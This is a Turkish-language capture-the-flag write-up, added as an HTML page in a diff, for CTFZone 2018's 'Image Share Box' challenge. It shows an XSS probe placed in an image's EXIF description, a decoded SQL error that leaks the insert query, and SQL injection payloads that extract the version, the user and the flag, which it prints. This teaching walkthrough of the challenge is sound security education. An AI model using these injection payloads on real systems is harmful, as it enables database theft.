@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html {
+      max-width: 70ch;
+      margin: auto;
+      line-height: 1.75;
+      font-size: 1.25em;
+    }
+
+    pre {
+      overflow: auto;
+    }
+
+    nav ul {
+      background: #faca46;
+      text-align: center;
+    }
+
+    nav ul li {
+      display: inline-block;
+      color: white;
+      margin-right: 10px;
+    }
+
+    nav ul li a {
+      text-decoration: none;
+    }
+
+    img {
+      width: 100%;
+    }
+  </style>
+</head>
+
+<nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="https://github.com/i64">Git</a></li>
+  </ul>
+</nav><h1>Image Share Box - CTFZone 2018</h1>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">We created a new cool service that allows you to share your images with everyone (it&#39;s on beta now)! The only thing you need to share something is an Image Description!
+</span><span style="color:#657b83;">Happy sharing!
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">https://img.ctf.bz
+</span>
+</code></pre>
+<p>Link'e gittik ve karşımıza böyle bir sayfa geldi</p>
+<p><img src="1.png" alt="" /></p>
+<p>Dropbox ile giriş yaptık, resim görüntüleme ve resim upload olmak üzere 2 adet sayfa vardı.</p>
+<p><img src="2.png" alt="" /></p>
+<p><img src="3.png" alt="" /></p>
+<p>Resim yüklemeye çalıştığımız zaman description'u olmadığını dile getiriyordu</p>
+<p><img src="4.png" alt="" /></p>
+<p><strong>EXIF</strong>'te ki <strong>Image description</strong> kısmından bashediyor olabilir mi dedik ve <strong>XSS</strong> payload'u koyalım dedik.</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">lorem&quot; onload=&quot;eval(&#39;debugger;&#39;)
+</span>
+</code></pre>
+<p>Fakat bir hata ile karsilastik
+<img src="5.png" alt="" /></p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">Unknown error. Please send this information to admin: 
+</span><span style="color:#657b83;">imgsbKF9teXNxbF9leGNlcHRpb25zLlByb2dyYW1taW5nRXJyb3IpICgxMDY0LCAiWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnZGVidWdnZXI7JyknLCAnaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy95bGVlejY1MjczeWR4MjAveHNzLmpwZWc/ZGw9MCZyYXc9MScsICcnIGF0IGxpbmUgMSIpIFtTUUw6ICdJTlNFUlQgSU5UTyBgaW1hZ2Vfc2hhcmVzYCAoYG93bmVyYCwgYGRlc2NyaXB0aW9uYCwgYGltYWdlX2xpbmtgLCBgYXBwcm92ZWRgKSBWQUxVRVMgKFwnZGJpZDpBQURPR1FjQkY3Um9lRWtRU3R4YmhnMFlsMW1BaTJPRjA4c1wnLCBcJ2xvcmVtIiBvbmxvYWQ9ImV2YWwoXCdkZWJ1Z2dlcjtcJylcJywgXCdodHRwczovL3d3dy5kcm9wYm94LmNvbS9zL3lsZWV6NjUyNzN5ZHgyMC94c3MuanBlZz9kbD0wJnJhdz0xXCcsIFwnMFwnKSddIChCYWNrZ3JvdW5kIG9uIHRoaXMgZXJyb3IgYXQ6IGh0dHA6Ly9zcWxhbGNoZS5tZS9lL2Y0MDUpc
+</span>
+</code></pre>
+<p><strong>imgsb</strong>'den sonraki kısımın <strong>base64</strong>'olduğu belliydi ve decode ettik.</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">(_mysql_exceptions.ProgrammingError) (1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;debugger;&#39;)&#39;, &#39;https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&amp;raw=1&#39;, &#39;&#39; at line 1&quot;) [SQL: &#39;INSERT INTO `image_shares` (`owner`, `description`, `image_link`, `approved`) VALUES (\&#39;dbid:AADOGQcBF7RoeEkQStxbhg0Yl1mAi2OF08s\&#39;, \&#39;lorem&quot; onload=&quot;eval(\&#39;debugger;\&#39;)\&#39;, \&#39;https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&amp;raw=1\&#39;, \&#39;0\&#39;)&#39;] (Background on this error at: http://sqlalche.me/e/f405)t
+</span>
+</code></pre>
+<p>Hatalı sorgu böyle imiş</p>
+<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<span style="color:#859900;">INSERT INTO </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_shares</span><span style="color:#839496;">`</span><span style="color:#657b83;"> (</span><span style="color:#839496;">`</span><span style="color:#2aa198;">owner</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">description</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_link</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">approved</span><span style="color:#839496;">`</span><span style="color:#657b83;">) </span><span style="color:#859900;">VALUES</span><span style="color:#657b83;"> (</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">dbid:AADOGQcBF7RoeEkQStxbhg0Yl1mAi2OF08s</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">lorem&quot; onload=&quot;eval(</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">debugger;</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">)</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&amp;raw=1</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">0</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)
+</span>
+</code></pre>
+<p>Sorgunun normal halini çıkarttık</p>
+<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<span style="color:#859900;">INSERT INTO </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_shares</span><span style="color:#839496;">`</span><span style="color:#657b83;"> (</span><span style="color:#839496;">`</span><span style="color:#2aa198;">owner</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">description</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_link</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">approved</span><span style="color:#839496;">`</span><span style="color:#657b83;">) </span><span style="color:#859900;">VALUES</span><span style="color:#657b83;"> (</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">dbid:$owner</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">$description</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">$image_link</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">0</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)
+</span>
+</code></pre>
+<p>Artık <strong>SQL injection</strong> yapabiliriz.</p>
+<p>Versiyon bilgisini alalım ilk olarak</p>
+<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">test</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(select version()),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
+</span>
+</code></pre>
+<p><img src="6.png" alt="" /></p>
+<p>Sonra kullanıcı bilgisini</p>
+<pre style="background-color:#fdf6e3;" lang="sql"><code>
+<span style="color:#657b83;">aciklama</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(select user()),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
+</span>
+</code></pre>
+<p><img src="7.png" alt="" /></p>
+<p>Daha sonra ise flag'i</p>
+<pre style="background-color:#fdf6e3;" lang="sql"><code>
+<span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(SELECT GROUP_CONCAT(owner,0x3a,description) FROM image_shares AS a WHERE id=&quot;1&quot;),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
+</span>
+</code></pre>
+<p><img src="8.png" alt="" /></p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">dbid:736b6e6f5070336f26696e6c2b6f657651657a75:ctfzone{b4827d53d3faa0b3d6f20d73df5e280f}
+</span>
+</code></pre>
+<p>ve flag</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">ctfzone{b4827d53d3faa0b3d6f20d73df5e280f}
+</span>
+</code></pre>
+</html>
